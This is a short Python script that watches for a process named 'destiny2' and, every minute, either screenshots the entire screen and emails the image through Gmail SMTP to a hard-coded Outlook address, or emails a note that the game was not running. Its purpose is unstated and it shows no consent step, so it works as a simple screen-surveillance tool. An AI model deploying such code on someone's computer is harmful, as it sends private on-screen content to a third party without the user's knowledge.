import requests
import json
from enum import Enum
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyscreenshot as ImageGrab
import imghdr
import time
import psutil
from config import (
	gmail_app_password
)

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


emailToSendTo = "Hdcostomersup@outlook.com"



gmail_user = "godsplanabcd@gmail.com"

while True:
	try:
		# Check if any chrome process was running or not.
		if checkIfProcessRunning('destiny2'):
			ts = time.time()
			im = ImageGrab.grab()
			im.save("destiny.png")
			msg = MIMEMultipart()
			msg['From'] = gmail_user
			msg['To'] = str(emailToSendTo)
			msg['Subject'] = "Gods plan : " + str(ts)
			with open('destiny.png', 'rb') as fp:
				img = MIMEImage(fp.read())
				img.add_header('Content-Disposition', 'attachment', filename="destiny.png")
				msg.attach(img)

			try:
				server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
				server.ehlo()
				server.login(gmail_user, gmail_app_password)
				server.sendmail(gmail_user, emailToSendTo, msg.as_string())
				server.close()

				print('Email sent! to the embassy of ' + str(ts))
			except Exception as exception:
				print("Error: %s!\n\n" % exception)

		else:
			ts = time.time()

			sent_body = (
						  "destiny wasn't open timestamp\n"
						  +str(ts)+"\n")

			msg = MIMEMultipart()
			msg['From'] = gmail_user
			msg['To'] = str(emailToSendTo)
			msg['Subject'] = "Gods plan destiny wasn't open : " + str(ts)
			part1 = MIMEText(sent_body, 'plain')
			msg.attach(part1)

			try:
				server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
				server.ehlo()
				server.login(gmail_user, gmail_app_password)
				server.sendmail(gmail_user, emailToSendTo, msg.as_string())
				server.close()

				print('Email sent! to the embassy of ' + str(ts))
			except Exception as exception:
				print("Error: %s!\n\n" % exception)

			print('No chrome process was running')
	except Exception as exception:
		print("Error 1: %s!\n\n" % exception)
	time.sleep(60 * 1)
